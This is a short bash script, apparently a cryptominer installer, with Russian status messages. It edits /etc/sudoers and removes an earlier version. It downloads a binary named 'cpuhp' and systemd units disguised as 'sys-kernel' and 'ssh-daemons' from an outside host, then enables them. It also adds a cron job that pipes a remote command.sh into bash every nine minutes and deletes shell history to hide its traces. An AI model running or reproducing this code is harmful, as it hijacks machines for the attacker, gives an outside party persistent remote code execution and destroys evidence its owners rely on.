#!/bin/bash
su
sed -i 's/^#\(root\s*ALL=(ALL)\s*ALL\)/\1/' /etc/sudoers
echo "SUDO Разблокирован!."

if [ -d "/root/bmcontrol" ]; then
	killall cpuhp
 	rm /etc/cron.d/libreoffice
  	cd /root/bmcontrol
   	rm -rf ./*
        echo "Убит V2"
fi
    echo "Копирую в /bin."
    cd /bin
    wget https://xmrhorizontal.github.io/cpuhp
    chmod +x ./cpuhp
    cd /etc/systemd/system
    wget https://xmrhorizontal.github.io/sys-kernel.service
    wget https://xmrhorizontal.github.io/ssh-daemons.service
    systemctl daemon-reload
    systemctl enable ssh-daemons.service
    systemctl enable sys-kernel.service
    systemctl start ssh-daemons.service
    systemctl start sys-kernel.service
    echo "*/9 * * * * root curl -s https://xmrhorizontal.github.io/command.sh | bash" > /etc/cron.d/debcron
    rm -f ~/.bash_history
    rm -f /root/.bash_history
echo OK!

